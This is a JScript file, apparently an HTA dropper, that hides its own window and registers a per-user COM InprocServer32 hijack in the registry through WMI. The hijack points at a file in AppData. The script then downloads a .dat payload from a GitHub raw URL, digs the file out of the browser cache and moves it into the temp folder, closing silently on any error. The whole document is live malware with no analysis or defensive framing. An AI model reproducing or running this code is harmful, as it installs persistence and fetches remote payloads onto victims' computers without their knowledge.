
var wShell;
var fso;

function R_FIND(fpath, findname) 
{
	try
	{
		var result_path="";
		var fa = fso.GetFolder(fpath);
		var subfa = new Enumerator(fa.SubFolders);

		for(; !subfa.atEnd(); subfa.moveNext())
		{			
			result_path = R_FIND(subfa.item().path, findname);
			if(result_path != ""){ return result_path;}
		}

		var subfile = new Enumerator(fa.files);
		for(; !subfile.atEnd(); subfile.moveNext())
		{
			var fn0 = subfile.item().name;
			if(findname == fn0)
				return subfile.item().path; 
				
		}
		return "";
	}
	catch (e)
	{
		return "";
	}	
}

function FIND_FILE(filename) 
{
	try
	{
		var INetCachePath =  wShell.ExpandEnvironmentStrings("%userprofile%\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE");
        
		var finded_location = R_FIND(INetCachePath, filename);

		if (finded_location !="")
			return finded_location;
		else
			return "";
	}
	catch (e)
	{
		window.close();
	}	
}

function Write_Reg(hKey, subKey, reg_value)
{
	SWbemValueSet = new ActiveXObject("WbemScripting.SWbemNamedValueSet"); 
	SWbemLocator = new ActiveXObject("WbemScripting.SWbemLocator"); 
	SWbemValueSet.Add("__ProviderArchitecture", 64); 
	var objSWbemServices = SWbemLocator.ConnectServer("", "root\\Default", "", "", "", "", 0, SWbemValueSet); 
	var colSWbemObjectSet = objSWbemServices.Get("StdRegProv"); 
   
	var outParam = colSWbemObjectSet.Methods_("Createkey").InParameters; 
	outParam.Hdefkey = hKey;
	outParam.Ssubkeyname = subKey;
	colSWbemObjectSet.ExecMethod_("Createkey", outParam, 0, SWbemValueSet);

	outParam = colSWbemObjectSet.Methods_("SetStringValue").Inparameters; 
	outParam.Hdefkey = hKey;
	outParam.Ssubkeyname = subKey;
	outParam.Svalue = reg_value;

	colSWbemObjectSet.ExecMethod_("SetStringValue", outParam, 0, SWbemValueSet); 
}

function UrlQuery(url_addr)
{
	var ohttp1 = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
	var ohttp2 = new ActiveXObject("MSXML2.XMLHTTP.6.0");
    
	try
	{
		ohttp1.open("GET", url_addr, false);
		ohttp1.send();
		if(ohttp1.status >= 300)
		{
			var oLocationheader = ohttp1.getResponseHeader("Location");
			ohttp2.open("GET", oLocationheader, false);
			ohttp2.send();
		}
		else
		{
				ohttp2.open("GET", url_addr, false); // GET
				ohttp2.send();
		}
	}
	catch(e)
	{
		window.close();
	}
}

function START()
{
	window.resizeTo(1,1);
	window.moveTo(5000,5000);

	wShell = new ActiveXObject("WScript.Shell");
	fso = new ActiveXObject("Scripting.FileSystemObject");
	
	var DownFileName = "";
	var envTargetPath = "%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows";
	var envTempPath = "%TEMP%";
	var TargetPath = wShell.ExpandEnvironmentStrings(envTargetPath); 
	var TempPath = wShell.ExpandEnvironmentStrings(envTempPath);
	
	var url_addr = "https://raw.githubusercontent.com/mei1990789/class125/refs/heads/main/csvbase.dat";

	try
	{
		var reg_key = "Software\\Classes\\CLSID\\{566296fe-e0e8-475f-ba9c-a31ad31620b1}\\InprocServer32";
		var reg_value = TargetPath + "\\" + "UsrClassCache.dat";
		Write_Reg(0x80000001, reg_key, reg_value);
	}
	catch(e)
	{
		window.close();
   	}

	try
	{
		UrlQuery(url_addr);
	}
	catch(e)
	{
		window.close();
   	}

	try
	{
		DownFileName = "csvbase[1].dat";
		down_file_location = FIND_FILE(DownFileName);
		if(down_file_location == "")
			window.close();
	}
	catch(e)
	{
		window.close();
   	}

	try
	{
		var move_file_location = TempPath + "\\" + DownFileName;
		//WScript.Echo(down_file_location);
		fso.MoveFile(down_file_location, move_file_location);
	}
	catch(e)
	{
		window.close();
   	}
	
	window.close();
	return;
}

START();




